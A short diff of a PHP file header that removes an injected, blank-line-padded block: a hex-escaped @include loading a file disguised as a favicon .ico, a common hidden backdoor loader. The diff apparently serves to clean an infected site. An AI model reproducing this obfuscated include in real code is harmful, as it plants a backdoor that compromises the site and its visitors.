@@ -1,24 +1,4 @@
-<?php
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-/*c0c6a*/
-
-@include "\x2fhom\x65/fe\x72oma\x64el.\x63om/\x77eb/\x63li/\x66avi\x63on_\x646aa\x37a.i\x63o";
-
-/*c0c6a*/
+<?php 
 /**
  * PHP 5
  *
